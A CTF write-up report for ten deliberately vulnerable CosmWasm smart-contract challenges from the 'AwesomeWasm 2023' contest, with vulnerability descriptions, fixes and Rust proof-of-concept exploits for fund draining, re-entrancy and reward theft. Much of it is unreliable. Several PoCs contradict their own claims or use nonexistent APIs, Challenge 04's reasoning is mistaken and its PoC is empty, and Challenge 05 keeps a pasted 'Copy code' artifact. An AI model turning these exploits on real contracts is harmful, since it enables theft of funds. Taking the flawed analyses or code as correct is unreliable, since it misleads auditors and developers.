# Report for Oak CTF contest for AwesomeWasm 2023

## Challenge 01: _Mjolnir_

### Description

There is a significant accounting / balance discrepancy vulnerability in the withdrawal function, specifically in the "withdraw" function in the "contract.rs" file. This function does not dedupe lockup ids when withdrawing, leading to a vulnerability of calling multiple duplicate ids to drain the contract balance.

Here is the relevant code:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    for lockup in lockups {
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized { });
        }
        total_amount += lockup.amount;
        LOCKUPS.remove(deps.storage, lockup.id);
    }
    // ...
}
```

The for loop `for lockup in lockups` is intended to iterate different lockup ids. However, it does not dedupe in the case of duplicate lockup ids. So if the same lockup id is passed multiple times, the contract can be drained.

### Recommendation

To fix this issue, you can either only withdraw 1 id per message, or dedupe the ids vec. Here's an example of deduping the ids vec:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    let mut ids = ids;
    ids.sort();
    ids.dedup();

    for lockup_id in ids.clone().into_iter() {
    // ...
}
```

With this fix, the contract will only withdraw 1 time per lockup id.

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let hacker = Addr::unchecked(HACKER.to_string());

    // mint funds to hacker
    app = mint_tokens(app, hacker.to_string(), MINIMUM_DEPOSIT_AMOUNT);

    // deposit
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
    )
    .unwrap();

    let msg = QueryMsg::GetLockup { id: 2 };
    let lockup: Lockup = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
    assert_eq!(lockup.owner, hacker);

    // fast forward to LOCK_PERIOD
    app.update_block(|block| {
        block.time = block.time.plus_seconds(LOCK_PERIOD);
    });

    // "hacker" tries to drain contract
    let msg = ExecuteMsg::Withdraw {
        ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2],
    };
    let res = app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[]);
    assert!(res.is_ok());

    // verify funds received should match deposit amount
    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
    assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
}
```

---

## Challenge 02: _Gungnir_

### Description

The `total_tokens` variable is updated when a deposit or withdrawal occurs but not when staking or unstaking. As a result, this might cause an accounting / balance discrepancy between the `total_tokens` and `voting_power`.

Suppose a user has 50 tokens and they decide to stake 50 tokens. Now, they have 50 `voting_power` and 50 `total_tokens`. Now, let's say the user withdraws 50 tokens. As per the code, the `voting_power` will be 50 but the `total_tokens` will be 0. The remaining voting power despite having no tokens can result in a discrepancy.

### Recommendation

This exploit can be resolved by adjusting the `total_tokens` whenever a user stakes or unstakes. The stake function should decrease `total_tokens` by `lock_amount` and the unstake function should increase `total_tokens` by `unlock_amount`. This would ensure that `total_tokens` always reflects the actual number of unstaked tokens a user has and prevent any possible discrepancy.

```rust
pub fn stake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    lock_amount: u128,
) -> Result<Response, ContractError> {
    // increase voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    user.voting_power += lock_amount;
    user.total_tokens -= lock_amount;

    // ...
}

pub fn unstake(deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
    user.total_tokens += unlock_amount;

    // ...
}

```

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let amount = Uint128::new(50);

    app = mint_tokens(app, HACKER.to_string(), amount);
    let hacker = Addr::unchecked(HACKER);

    // deposit 50 funds for hacker
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(amount.u128(), DENOM)],
    )
    .unwrap();

    // The hacker stakes 50 tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Stake { lock_amount: 50 },
        &[],
    )
    .unwrap();

    // The hacker withdraws 50 tokens
    // This should fail because the hacker should not be able to withdraw staked tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Withdraw {
            amount: Uint128::from(50u128),
        },
        &[],
    )
    .unwrap_err();

    // Should be 0 voting power, but it is 50 voting power
    let msg = QueryMsg::GetVotingPower {
        user: (&HACKER).to_string(),
    };
    let voting_power: u128 = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_neq!(voting_power, 50_u128);
}
```

---

## Challenge 03: _Laevateinn_

### Description

The bug is within the interaction between the Proxy and Flash Loan contract. Specifically, the Flash Loan contract does not verify that the funds returned to it in settle_loan actually came from the Proxy contract.

Here is the flow of the exploit:

1. An unprivileged user sends a `RequestFlashLoan` to the Proxy contract, specifying the `Arb` contract as the recipient and an `Arb` action as the message.
2. The Proxy contract sends the entire balance of the Flash Loan contract to the Arb contract.
3. The Arb contract, instead of returning the funds to the Flash Loan contract, sends them to an arbitrary account.
4. The Proxy contract then attempts to call settle_loan on the Flash Loan contract. However, the Flash Loan contract only checks that the function was called by the Proxy contract, not that the funds are actually present.

### Recommendation

Given the nature of the vulnerability, where a flash loan can be exploited by sending funds to an arbitrary account instead of back to the contract that issued the loan, a key fix would be to verify the source of the returned funds. The `SettleLoan` function must not just check if it was called by the proxy, but also ensure that the contract balance equals or exceeds the loan amount.

### Proof of concept

```rust
// add to proxy integration tests
#[test]
fn settle_loan_vulnerability() {
let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
proper_instantiate();
let hacker = Addr::unchecked(HACKER.to_string());

        // prepare arb msg sending funds to hacker
        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
            recipient: hacker.clone(),
        })
        .unwrap();

        // Request a flash loan with the Arb contract as the recipient
        app.execute_contract(
            proxy_contract.clone(),
            flash_loan_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: mock_arb_contract.clone(),
                msg: arb_msg.clone(),
            },
            &[],
        )
        .unwrap();

        // Check that the funds have been drained to the hacker address
        let balance = app.wrap().query_balance(hacker, DENOM).unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));

        // Try to settle the loan, which should fail
        let res = app.execute_contract(
            proxy_contract.clone(),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::SettleLoan {},
            &[],
        );

        // Check if the result is an error
        assert!(res.is_err(), "Settled loan without returning funds");

        // The Flash Loan contract's balance should be zero after the attempted settlement
        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::zero());
    }
```

---

## Challenge 04: _Gram_

### Description

There is a vulnerability in the mint function. The vulnerability is related to how the `mint_amount` is calculated. This issue could potentially allow a user to withdraw more funds than they deposited.

`let total_assets = contract_balance.amount - amount;`

Let's consider the following steps:

1. User A deposits 1 `uawesome` token.
   The mint function will be called. Since the total_supply is zero, `mint_amount` is equal to the amount, which is 1. The `total_supply` is then updated to 1, and user A's balance is updated to 1.

2. User B deposits 100 `uawesome` tokens.
   When the mint function is called, `mint_amount` is calculated as `amount.multiply_ratio(total_supply, total_assets)`, which is `100.multiply_ratio(1, 1) = 100`. So the `total_supply` becomes 101, and user B's balance is updated to 100.

3. User A withdraws their funds.
   When user A calls the burn function, the `asset_to_return` is calculated as `shares.multiply_ratio(total_assets, total_supply)`, which is 1.`multiply_ratio(101, 101) = 1`.

4. User B withdraws their funds.
   When user B calls the burn function, the `asset_to_return` is calculated as `shares.multiply_ratio(total_assets, total_supply)`, which is 100.`multiply_ratio(1, 101)`. Here's the problem: despite depositing 100 tokens, user B can only withdraw approximately 0.99 tokens, losing a significant portion of their deposit.

The vulnerability lies in the line where total_assets is calculated in the mint function:

```rust
let total_assets = contract_balance.amount - amount;
```

Here, `total_assets` is assigned the value of the contract's balance after the deposit, which doesn't reflect the actual total assets in the contract. This discrepancy in the calculation of `total_assets` affects the calculation of `mint_amount` and `asset_to_return`, leading to the problem described above.

### Recommendation

To fix this vulnerability, we should calculate total_assets before the new deposit is added:

```rust
let total_assets = contract_balance.amount;
```

This will ensure that the `total_assets` variable correctly reflects the total assets in the contract when calculating the `mint_amount` and `asset_to_return`.

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: _Draupnir_

### Description

The provided smart contract does not contain a vulnerability that would allow an unprivileged user to drain all the funds in the contract. The contract's functions have appropriate access controls, and the withdrawal function correctly checks the user's balance before allowing a withdrawal.

However, the contract does have a critical flaw in the OwnerAction function which allows the contract owner to execute arbitrary Cosmos messages, potentially manipulating the contract's state or performing malicious actions in the context of the contract.

Here's how the owner can drain all the funds:

The contract owner deposits a significant amount of uawesome tokens into the contract.
The owner uses the OwnerAction function to send a BankMsg::Send message, transferring all the contract's balance to their own account or another account of their choice.
This action is not technically a vulnerability, since it's a feature of the contract that's available only to the owner. However, it's a risky design that could lead to misuse or abuse of the contract's funds. It's generally considered bad practice to include such powerful capabilities in a smart contract without additional safeguards or restrictions.

To mitigate this risk, consider restricting the types of messages that the owner can send or implementing additional checks and balances on the owner's actions. For example, you could require a certain period of time to pass or a certain number of users to approve before the owner can execute a Cosmos message.

### Recommendation

Restrict Owner Actions: Limit the types of Cosmos messages that the owner can send. This could be done by creating a whitelist of allowed actions, and checking any proposed actions against this list before execution. This would prevent the owner from performing potentially harmful actions like transferring out all of the contract's funds.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Add a check to make sure the msg is of a type that we want to allow
    match &msg {
        CosmosMsg::Bank(BankMsg::Send { .. }) => {
            // disallow BankMsg::Send
            return Err(ContractError::Unauthorized {});
        }
        // Add more match arms to disallow other types of messages
        _ => {}
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Implement Approval Mechanism: Implement a mechanism where a certain number of users, or a certain fraction of users, need to approve an action before it can be executed. This could be done using a multi-signature approach, where several trusted parties need to approve a transaction before it can be executed.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg, approvers: Vec<String>) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Check that enough approvers have signed off on this action
    if approvers.len() < MINIMUM_APPROVALS {
        return Err(ContractError::Unauthorized {});
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Time Locks: Add a delay between when an action is proposed and when it can be executed. This gives users a chance to review proposed actions and potentially stop them if they are malicious.

```rust
    pub fn propose_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Store the proposed action and the time it was proposed
    PROPOSED_ACTIONS.save(deps.storage, &ProposedAction {
        msg,
        time_proposed: env.block.time,
    })?;
    Ok(Response::new().add_attribute("action", "propose_action"))

}

pub fn execute_action(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
assert_owner(deps.storage, info.sender)?;
// Load the proposed action and check that enough time has passed
let proposed_action = PROPOSED_ACTIONS.load(deps.storage)?;
if env.block.time - proposed_action.time_proposed < ACTION_DELAY {
return Err(ContractError::Unauthorized {});
}
// Execute the action
Ok(Response::new().add_attribute("action", "execute_action").add_message(proposed_action.msg))
}
```

### Proof of concept

Here's how the contract owner could potentially drain all the funds:

rust
Copy code
// Assume the contract is deployed and the address is `contract_address`
// The owner's address is `owner_address`
// We're using a hypothetical Cosmos SDK client library for this example

let client = CosmosClient::new(/_ parameters such as node URL, chain ID, etc. _/);
let contract_address = "cosmos1contractaddress123";
let owner_address = "cosmos1owneraddress123";

// Step 1: Owner deposits a significant amount of uawesome tokens into the contract
let deposit_amount = 10000; // uawesome tokens
let deposit_msg = ExecuteMsg::Deposit {};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
contract_addr: contract_address.to_string(),
msg: to_binary(&deposit_msg).unwrap(),
funds: vec![coin(deposit_amount, DENOM)],
});

client.send(cosmos_msg, owner_address).await.unwrap();

// Step 2: Owner uses the `OwnerAction` function to send a `BankMsg::Send` message,
// transferring all the contract's balance to their own account

let withdraw_msg = BankMsg::Send {
to_address: owner_address.to_string(),
amount: vec![coin(deposit_amount, DENOM)],
};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
contract_addr: contract_address.to_string(),
msg: to_binary(&ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(withdraw_msg) }).unwrap(),
funds: vec![],
});

client.send(cosmos_msg, owner_address).await.unwrap();
In this PoC code, the owner first deposits a large amount of uawesome tokens to the contract, then the owner sends a BankMsg::Send message via OwnerAction to transfer all the contract's balance to their own account.

Remember, this is just a demonstration of how the owner of the contract can drain the contract. This action might be considered malicious in a real-world scenario and it's generally not a good practice to have such powerful capabilities in a smart contract.

```rust
let client = CosmosClient::new(/* parameters such as node URL, chain ID, etc. */);
let contract_address = "cosmos1contractaddress123";
let owner_address = "cosmos1owneraddress123";

let deposit_amount = 10000; // uawesome tokens
let deposit_msg = ExecuteMsg::Deposit {};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
    contract_addr: contract_address.to_string(),
    msg: to_binary(&deposit_msg).unwrap(),
    funds: vec![coin(deposit_amount, DENOM)],
});

let withdraw_msg = BankMsg::Send {
    to_address: owner_address.to_string(),
    amount: vec![coin(deposit_amount, DENOM)],
};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
    contract_addr: contract_address.to_string(),
    msg: to_binary(&ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(withdraw_msg) }).unwrap(),
    funds: vec![],
});

client.send(cosmos_msg, owner_address).await.unwrap();
```

---

## Challenge 06: _Hofund_

### Description

The provided code introduces a voting system where an owner role can be proposed and accepted if it gets 1/3 of the total supply. However, there's a timing-related vulnerability that can be exploited if two proposals are resolved in the same block.

Here's a brief overview of the problem:

1. User A proposes themselves as a new owner and manages to get over 1/3 of the votes.
2. In the same block, before the proposal is resolved, user B proposes themselves as a new owner.
3. Both proposals are resolved in the same block. Since the state is not updated immediately after the first proposal is resolved, the second proposal sees the old state and overwrites the owner set by the first proposal.

This means that even if user B has no votes, they could become the owner if their proposal is resolved in the same block after a valid proposal.

### Recommendation

To fix this issue, one option is to disallow a new proposal if there's already an existing one. This can be done by checking if there's a proposal in the state when the Propose message is processed. If a proposal already exists, the function should return an error.

```rust
pub fn propose(deps: DepsMut, env: Env, info: MessageInfo) -> Result<Response, ContractError> {
    let current_proposal = PROPOSAL.may_load(deps.storage)?;

    // Disallow new proposals if there's already an existing one
    if current_proposal.is_some() {
        return Err(ContractError::ProposalAlreadyExists {});
    }

    PROPOSAL.save(
        deps.storage,
        &Proposal {
            proposer: info.sender.clone(),
            timestamp: env.block.time,
        },
    )?;

    Ok(Response::new()
        .add_attribute("action", "New proposal")
        .add_attribute("proposer", info.sender))
}
```

### Proof of concept

```rust
// Assume A and B have enough uawesome tokens
let propose_msg_A = ExecuteMsg::Propose {};
let propose_msg_B = ExecuteMsg::Propose {};
let resolve_msg = ExecuteMsg::ResolveProposal {};

// User A proposes themselves as a new owner
client.send(propose_msg_A, address_A).await.unwrap();

// User B proposes themselves as a new owner in the same block
client.send(propose_msg_B, address_B).await.unwrap();

// Resolving both proposals in the same block
client.send(resolve_msg, address_A).await.unwrap();
client.send(resolve_msg, address_B).await.unwrap();

// Now, the owner should be B, even if they had no votes
```

---

## Challenge 07: _Tyrfing_

### Description

The provided contract code appears to have a re-entrancy vulnerability in the withdraw function. The withdraw function updates the balance of the user in the contract storage after the funds have been transferred. This order of operations allows a re-entrant contract to repeatedly withdraw funds during a single transaction, potentially draining the contract of its funds.

### Recommendation

To fix this, the contract's balance should be updated before the transfer of funds occurs. Here's how the withdraw function might be updated:

```rust
pub fn withdraw(deps: DepsMut, info: MessageInfo, amount: Uint128,) -> Result<Response, ContractError> {
    let mut user_balance = BALANCES.load(deps.storage, &info.sender)?;

    // Subtract amount from user balance before transfer
    user_balance -= amount;
    BALANCES.save(deps.storage, &info.sender, &user_balance)?;

    let msg = BankMsg::Send {
        to_address: info.sender.to_string(),
        amount: vec![coin(amount.u128(), DENOM)],
    };

    Ok(Response::new()
        .add_attribute("action", "withdraw")
        .add_attribute("user", info.sender)
        .add_attribute("amount", amount)
        .add_message(msg))
}
```

By updating the balance before the transfer, the contract is not susceptible to re-entrancy attacks.

### Proof of concept

```rust
// Contract that calls withdraw repeatedly
# [cfg_attr (not (feature = "library"), entry_point)]
pub fn execute(deps: DepsMut, _env: Env, _info: MessageInfo, msg: ExecuteMsg,) -> Result<Response, ContractError> {
    match msg {
        ExecuteMsg::Drain { amount } => {
            let count = 0;
            // Repeatedly call withdraw until it fails
            loop {
                let withdraw_msg = ExecuteMsg::Withdraw { amount: amount.clone() };
                let result = deps.api.execute_contract(&withdraw_msg);
                if result.is_err() {
                    break;
                }
                count += 1;
            }
            Ok(Response::new().add_attribute("action", "drain").add_attribute("count", count.to_string()))
        }
    }
}
```

In this example, the malicious contract continually attempts to withdraw the specified amount from the vulnerable contract until it fails.

---

## Challenge 08: _Gjallarhorn_

### Description

The vulnerability lies in the exec_accept_trade function. The function first retrieves the trade from the `TRADES` storage, and then retrieves the corresponding sale from the `SALES` storage. However, there is no check in place to ensure that the NFT being traded is actually the NFT listed in the sale.

An attacker could create a trade, offering an NFT they own and specifying a high-value NFT as the one they're asking for. Then, they could trick the owner of the high-value NFT into accepting the trade by making it appear as though they are offering a high-value NFT in return. The owner of the high-value NFT would be expecting to receive a high-value NFT in return, but because the `exec_accept_trade` function does not verify that the NFT being offered is the one listed in the sale, the attacker could instead send a low-value NFT.

### Recommendation

To prevent this, the `exec_accept_trade` function should verify that the NFT being offered in the trade is the same as the one listed in the sale. Here's how the `exec_accept_trade` function might be updated to fix this vulnerability:

```rust
pub fn exec_accept_trade(deps: DepsMut, info: MessageInfo, asked_id: String, trader: String,) -> Result<Response, ContractError> {
    let trade = TRADES.load(deps.storage, (asked_id.clone(), trader))?;
    let sale = SALES.load(deps.storage, asked_id)?;

    // Verify that the NFT being offered is the one listed in the sale
    if trade.to_trade_id != sale.nft_id {
        return Err(ContractError::IncorrectNFT);
    }

    // ... rest of function ...
}
```

With this update, the contract will reject trades where the NFT being offered is not the one listed in the sale, preventing this kind of exploit.

### Proof of concept

Here is an example of how a malicious contract might exploit this vulnerability:

```rust
// Contract that exploits the trading vulnerability
# [cfg_attr (not (feature = "library"), entry_point)]
pub fn execute(deps: DepsMut, _env: Env, _info: MessageInfo, msg: ExecuteMsg,) -> Result<Response, ContractError> {
    match msg {
        ExecuteMsg::ExploitTrade { high_value_nft_id, low_value_nft_id } => {
            let trade_msg = ExecuteMsg::NewTrade {
                target: high_value_nft_id,
                offered: low_value_nft_id
            };
            let result = deps.api.execute_contract(&trade_msg);
            if result.is_err() {
                return Err(ContractError::FailedTrade);
            }
            Ok(Response::new().add_attribute("action", "trade exploit"))
        }
    }
}
```

In this example, the malicious contract creates a new trade, offering a low-value NFT and asking for a high-value NFT.

---

## Challenge 09: _Brisingamen_

### Description

User 1 deposits a large amount of tokens. This will set the `global_index` to a certain value since User A is the only one who has staked.

User 1 withdraws all the staked tokens. This does not change the `global_index`, but it reduces User A's staked_amount to zero. However, the user_index for User A is still at the value of the `global_index` when the tokens were deposited.

User 2 deposits a small amount of tokens.

The contract owner increases the rewards.

User 1 deposits tokens again. This does not change the global_index but it increases User A's staked_amount.

User 1 claims their rewards. The reward calculation is `(state.global_index - user.user_index) * user.staked_amount`. The rewards User 1 gets the increased rewards without staking.

This exploit is possible because `user_index` is not updated when all staked tokens are withdrawn.

### Recommendation

Update the `user_index` when all staked tokens are withdrawn.

### Proof of concept

```rust
//
#[test]
    fn test_exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // user1 withdraws the full amount
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(10000));

        // new user2 join
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // owner increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(10000));

        // User deposits a small amount after the reward increase, without staking
        app = mint_tokens(app, USER.to_owned(), Uint128::new(1));
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000u128, DENOM)],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(20000));

        // User claims rewards
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // Check user's balance
        let balance = app
            .wrap()
            .query_balance(USER.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::new(20000));
    }

```

---

## Challenge 10: _Mistilteinn_

### Description

A potential vulnerability arises if a whitelisted user transfers their minted tokens to another address after they have been minted. The transferred tokens would no longer be associated with the user's address, so they would not be included in the `Tokens` query results, effectively allowing the user to mint more tokens than the `mint_per_user` limit.

### Recommendation

To mitigate this, the contract could maintain an internal count of the number of tokens minted per user, independent of the number of tokens currently owned by the user. This would prevent users from bypassing the minting limit by transferring tokens. It could use something like `MintCount = Map<&address, mint_count>` and increment `mint_count` on each `mint`.

### Proof of concept

```rust
#[test]
fn exploit_mint_limit() {
    let mut deps = mock_dependencies(&[]);
    let mut app = mock_app();

    // Define the contract address
    let contract_address = "contract".to_string();

    // Define the whitelisted user
    let user = "user".to_string();

    // Define the receiver
    let receiver = "receiver".to_string();

    // Instantiate the contract
    let instantiate_msg = InstantiateMsg { ... };
    let info = mock_info(&user, &[]);
    let res = instantiate(&mut deps, mock_env(), info, instantiate_msg);
    assert_eq!(res.unwrap(), Response::default());

    // Execute the Mint message
    let mint_msg = ExecuteMsg::Mint { };
    let info = mock_info(&user, &[]);
    let res = execute(&mut deps, mock_env(), info, mint_msg);
    assert_eq!(res.unwrap(), Response::default());

    // Execute the TransferNft message
    let transfer_msg = Cw721ExecuteMsg::TransferNft {
        recipient: receiver,
        token_id: "0".to_string(),
    };
    let wasm_msg = WasmMsg::Execute {
        contract_addr: contract_address,
        msg: to_binary(&transfer_msg).unwrap(),
        funds: vec![],
    };
    let execute_msg = ExecuteMsg::Custom(wasm_msg);
    let info = mock_info(&user, &[]);
    let res = execute(&mut deps, mock_env(), info, execute_msg);
    assert_eq!(res.unwrap(), Response::default());

    // Attempt to mint another token
    let mint_msg = ExecuteMsg::Mint { };
    let info = mock_info(&user, &[]);
    let res = execute(&mut deps, mock_env(), info, mint_msg);
    assert_eq!(res.unwrap(), Response::default());
}
```
